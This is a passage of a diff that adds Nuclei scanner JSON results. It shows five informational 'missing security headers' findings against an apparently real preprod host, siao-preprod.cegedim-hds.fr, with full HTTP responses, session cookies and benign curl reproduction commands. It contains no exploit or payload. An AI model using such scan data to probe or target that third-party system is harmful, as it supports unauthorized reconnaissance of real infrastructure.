+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "access-control-allow-methods",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.466728886Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "x-permitted-cross-domain-policies",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.466758186Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "cross-origin-resource-policy",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.466800886Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "access-control-allow-origin",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.466831987Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "access-control-allow-credentials",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.466861587Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
